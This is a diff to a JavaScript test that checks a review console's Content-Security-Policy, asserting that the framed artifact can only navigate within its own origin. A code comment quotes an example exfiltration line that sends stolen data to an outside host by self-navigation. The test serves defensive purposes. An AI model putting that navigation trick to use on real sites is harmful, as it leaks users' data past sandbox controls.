@@ -449,6 +449,16 @@ async function checkReviewShellWrapsTheArtifactAndCanEnqueue(port, home) {
   ok(shellCsp.includes("script-src 'self'"), 'the wrapper may run its own script')
   ok(shellCsp.includes("connect-src 'self'"), 'and reach the API - unlike the artifact it wraps')
   ok(!/unsafe-inline/.test(shellCsp), 'and needs no inline script or style to do either')
+  // frame-src is the artifact's LAST closed exit and the only one nothing on its
+  // own document covers: CSP does not police a document navigating ITSELF, and
+  // the sandbox flag for navigation governs the top, not the frame. The parent's
+  // frame-src is enforced on every later navigation of that frame, so exactly
+  // 'self' is what stops `location.href = 'http://elsewhere/?stolen=…'`. Widened
+  // to any host, a review page could walk out of the console carrying anything.
+  // Verified in a browser against an artifact that tries it (see review.mjs).
+  const frameSrc = shellCsp.split(';').map((c) => c.trim()).find((c) => c.startsWith('frame-src'))
+  equal(frameSrc, "frame-src 'self'", 'the artifact frame may only ever be navigated within this origin')
+  ok(shellCsp.includes("frame-ancestors 'none'"), 'and nothing may frame the shell itself')
 
   // The task record crosses as DATA, not prose - review.mjs is what decides how
   // to say it, and only ever from this shape.
